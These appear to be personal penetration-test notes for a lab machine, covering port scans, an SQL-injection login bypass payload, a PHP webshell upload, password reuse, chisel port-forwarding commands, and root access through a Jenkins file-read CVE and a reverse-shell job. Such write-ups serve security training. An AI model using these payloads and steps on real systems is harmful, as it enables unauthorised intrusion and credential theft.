
# Pentest Notes

## Target Information
**IP:**  192.168.45.228
**OS/Techno:** Ubuntu, PHP

## Credentials
- **User:**  
- **Password:** `RonnyCache001`

## Services
- **21/tcp FTP** → vsftpd 3.0.5 (anonymous login not useful)  
- **80/tcp HTTP** → Apache default page  
- **9443/tcp HTTPS** → Prison Management System, admin dashboard  
  - Tried `admin:admin` → failed  
  - Tried `root:root` → failed  
  - Confirmed SQL injection in `txtusername` (time-based blind, MySQL ≥ 5.0.12)  
- **22/tcp SSH** → OpenSSH 9.6p1 (no valid user yet)

## Nmap Scan
```
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
|_banner: 220 (vsFTPd 3.0.5)
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
9443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Exploitation
- SQL injection bypass:  
  ```
  username: admin' or 1=1-- -
  password: admin
  ```
  Logged into the dashboard.

- Found credential in dashboard: `RonnyCache001`  
- Uploaded PHP webshell by bypassing Content-Type check with BurpSuite.  
- Shell gained as `www-data`.  
- Reused password → got shell as `vmdak`.  
- Captured **user flag**.

## Privilege Escalation
Checked listening services:
```
ss -tupln
udp   127.0.0.54:53
udp   127.0.0.53%lo:53
tcp   0.0.0.0:80
tcp   0.0.0.0:21
tcp   0.0.0.0:22
tcp   0.0.0.0:9443
tcp   127.0.0.53%lo:53
tcp   127.0.0.1:8080
tcp   127.0.0.54:53
tcp   127.0.0.1:33060
tcp   127.0.0.1:3306
```

- Found Jenkins running on localhost:8080.  
- Port forwarding with **chisel**:  
  - On attacker:  
    ```bash
    ./chisel server -p 8000 --reverse
    ```
  - On target:  
    ```bash
    ./chisel client 192.168.45.228:8000 R:8000:127.0.0.1:8080
    ```

- Access Jenkins in browser: `http://127.0.0.1:8000`  
- Read Jenkins initial password: `/root/.jenkins/secrets/initialAdminPassword`  
- Vulnerable to **CVE-2024-23897**, used to read file and gain access.  

- Created a Jenkins job to execute a reverse shell.  
- Ran the job → obtained **root shell**.  


